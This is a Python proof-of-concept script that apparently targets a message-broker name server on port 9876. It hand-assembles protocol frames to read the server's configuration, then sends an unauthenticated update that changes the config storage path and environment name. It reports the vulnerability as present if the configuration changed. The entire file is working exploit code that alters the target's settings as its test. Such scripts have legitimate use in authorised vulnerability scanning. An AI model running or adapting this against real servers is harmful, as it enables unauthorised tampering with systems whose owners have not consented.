 1 import random
 2 import socket
 3 import binascii
 4 
 5 class poc:
 6     def __init__(self, url):
 7         self.url = url
 8         self.result_text = ""
 9         self.port = 9876
10 
11     def exploit(self, address):
12         try:
13             client_socket = socket.socket()
14             client_socket.settimeout(5)  # Set socket timeout to 5 seconds
15             client_socket.connect((address, self.port))
16 
17             header = '{"code":318,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":405}'.encode('utf-8')
18             body = 'configStorePath=/tmp/test\nproductEnvName=test'+ str(random.randint(1, 10))
19 
20             header_length = int(len(binascii.hexlify(header).decode('utf-8')) / 2)
21             header_length_hex = '00000000' + str(hex(header_length))[2:]
22             total_length = int(4 + len(binascii.hexlify(body.encode('utf-8')).decode('utf-8')) / 2 + header_length)
23             total_length_hex = '00000000' + str(hex(total_length))[2:]
24             data = total_length_hex[-8:] + header_length_hex[-8:] + binascii.hexlify(header).decode('utf-8') + binascii.hexlify(body.encode('utf-8')).decode('utf-8')
25 
26             client_socket.send(bytes.fromhex(data))
27             client_socket.recv(1024)
28 
29             client_socket.close()
30         except socket.timeout:
31             return False
32 
33     def get_namesrv_config(self, address):
34         try:
35             client_socket = socket.socket()
36             client_socket.settimeout(5)
37             client_socket.connect((address, self.port))
38 
39             header = '{"code":319,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":405}'.encode('utf-8')
40 
41             header_length = int(len(binascii.hexlify(header).decode('utf-8')) / 2)
42             header_length_hex = '00000000' + str(hex(header_length))[2:]
43             total_length = int(4 + header_length)
44             total_length_hex = '00000000' + str(hex(total_length))[2:]
45             data = total_length_hex[-8:] + header_length_hex[-8:] + binascii.hexlify(header).decode('utf-8')
46 
47             client_socket.send(bytes.fromhex(data))
48             data_received = client_socket.recv(1024)
49 
50             client_socket.close()
51             return data_received
52         except socket.timeout:
53             return False
54 
55     def main(self):
56         ip = self.url
57         result1 = self.get_namesrv_config(ip)
58         self.exploit(ip)
59         result2 = self.get_namesrv_config(ip)
60         if result2 != result1:
61             print("漏洞存在")
62         else:
63             print("漏洞不存在")
64 
65 if __name__ == '__main__':
66     ip = "127.0.0.1"
67     poc(ip).main()